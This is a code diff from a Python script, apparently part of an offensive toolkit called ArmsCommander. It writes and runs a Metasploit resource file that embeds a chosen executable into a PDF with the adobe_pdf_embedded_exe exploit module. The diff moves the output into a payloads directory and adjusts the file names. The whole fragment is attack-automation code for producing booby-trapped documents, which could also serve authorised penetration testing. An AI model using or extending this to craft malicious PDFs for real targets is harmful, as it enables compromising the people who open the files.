@@ -54,12 +54,12 @@ os.system('chmod 777 /root/ArmsCommander/remoteexploits/generate_pdf.rc')
 # AttributeError: 'file' object attribute 'write' is read-only
 
 # FIXED it was just syntax error. No ' = ' signs between the write portion. You want to change it to .write('stuff')
-
-makeembeddedpdf = open('/root/ArmsCommander/remoteexploits/generate_pdf.rc', 'w')
+payload_dir = '/root/ArmsCommander/payloads/'
+makeembeddedpdf = open('/root/ArmsCommander/payloads/generate_pdf.rc', 'w')
 makeembeddedpdf.write('use exploit/windows/fileformat/adobe_pdf_embedded_exe')
 makeembeddedpdf.write('\nset EXENAME ' + custom_executable)
-makeembeddedpdf.write('\nset INFILENAME ' + custom_pdf)
-makeembeddedpdf.write('\nset FILENAME ' + output_pdf)
+makeembeddedpdf.write('\nset INFILENAME ' + custom_pdf + '.pdf')
+makeembeddedpdf.write('\nset FILENAME ' + payload_dir + output_pdf)
 makeembeddedpdf.write('\nrun')
 makeembeddedpdf.close()
 print 'Your custom resource file is located at: %s' % makeembeddedpdf_name
